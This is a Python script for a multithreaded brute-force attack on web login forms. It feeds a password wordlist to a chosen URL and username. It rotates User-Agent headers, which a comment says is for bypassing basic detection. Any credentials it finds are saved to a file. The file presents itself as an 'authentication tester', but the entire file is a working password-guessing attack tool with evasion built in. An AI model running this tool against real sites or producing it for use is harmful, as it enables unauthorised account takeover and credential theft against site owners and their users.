import requests
import argparse
import threading
import queue
import random
import logging

# User-Agent list for bypassing basic detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
]

# Set up logging
class Logger:
    @staticmethod
    def setup_logger():
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[logging.FileHandler("bruteforce.log"), logging.StreamHandler()]
        )

class BruteForcer:
    def __init__(self, url, username, wordlist, param_user, param_pass, method, threads, success_keyword):
        self.url = url
        self.username = username
        self.wordlist = wordlist
        self.param_user = param_user
        self.param_pass = param_pass
        self.method = method.upper()
        self.threads = threads
        self.success_keyword = success_keyword
        self.queue = queue.Queue()

    def load_wordlist(self):
        try:
            with open(self.wordlist, "r", encoding="utf-8") as file:
                passwords = file.read().splitlines()
            logging.info(f"[+] Loaded {len(passwords)} passwords from {self.wordlist}")
            return passwords
        except FileNotFoundError:
            logging.error(f"[-] Wordlist file '{self.wordlist}' not found!")
            exit(1)

    def send_request(self, password):
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        data = {self.param_user: self.username, self.param_pass: password}

        try:
            if self.method == "POST":
                response = requests.post(self.url, data=data, headers=headers, timeout=10)
            else:
                response = requests.get(self.url, params=data, headers=headers, timeout=10)

            # Response filtering
            if response.status_code == 200 and self.success_keyword in response.text:
                logging.critical(f"[!!!] SUCCESS: {self.username} | {password}")
                with open("successful_attempts.txt", "a") as f:
                    f.write(f"{self.username}:{password}\n")
                exit(0)
            else:
                logging.info(f"[-] Failed: {self.username} | {password}")

        except requests.exceptions.RequestException as e:
            logging.error(f"[-] Request failed: {e}")

    def worker(self):
        while not self.queue.empty():
            password = self.queue.get()
            self.send_request(password)
            self.queue.task_done()

    def start_attack(self):
        passwords = self.load_wordlist()

        for password in passwords:
            self.queue.put(password)

        logging.info(f"[+] Starting brute-force attack with {self.threads} threads...")

        threads = []
        for _ in range(min(self.threads, self.queue.qsize())):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        logging.info("[+] Attack completed.")

class CLI:
    @staticmethod
    def parse_arguments():
        parser = argparse.ArgumentParser(description="Brute Force Authentication Tester")
        parser.add_argument("-u", "--url", required=True, help="Target login URL")
        parser.add_argument("-U", "--username", required=True, help="Username to test")
        parser.add_argument("-w", "--wordlist", help="Path to password wordlist")
        parser.add_argument("-pU", "--param-user",  help="Username parameter in request")
        parser.add_argument("-pP", "--param-pass",  help="Password parameter in request")
        parser.add_argument("-m", "--method", choices=["GET", "POST"], default="POST", help="HTTP method (default: POST)")
        parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads")
        parser.add_argument("--success-keyword", type=str, help="Keyword to indicate successful login")
        return parser.parse_args()

if __name__ == "__main__":
    try:
        Logger.setup_logger()
        args = CLI.parse_arguments()
        brute_forcer = BruteForcer(
            args.url, args.username, args.wordlist, args.param_user, args.param_pass,
            args.method, args.threads, args.success_keyword
        )

        brute_forcer.start_attack()
    except KeyboardInterrupt as ke:
        print(f"[-] {ke}")
    except Exception as e:
        print(f"[-] Error: {e}")
